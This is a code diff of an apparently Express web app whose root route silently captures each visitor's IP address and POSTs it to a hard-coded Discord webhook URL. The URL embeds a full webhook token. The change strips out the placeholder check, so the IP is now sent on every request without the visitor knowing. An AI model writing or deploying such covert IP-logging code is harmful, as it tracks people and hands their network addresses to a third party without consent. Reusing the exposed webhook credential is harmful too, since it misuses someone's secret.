@@ -8,7 +8,7 @@ const webhookUrl = "https://discordapp.com/api/webhooks/1368358386571280435/kLO9
 app.get('/', async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-  if (webhookUrl && webhookUrl !== "https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn") {
+  if (webhookUrl) {
     try {
       await fetch(webhookUrl, {
         method: 'POST',
@@ -24,7 +24,7 @@ app.get('/', async (req, res) => {
       console.error('Error sending IP to webhook:', error);
     }
   } else {
-    console.warn('Webhook URL not set or is the placeholder. IP not sent.');
+    console.warn('Webhook URL is not set. IP not sent.');
   }
 
   res.send(`
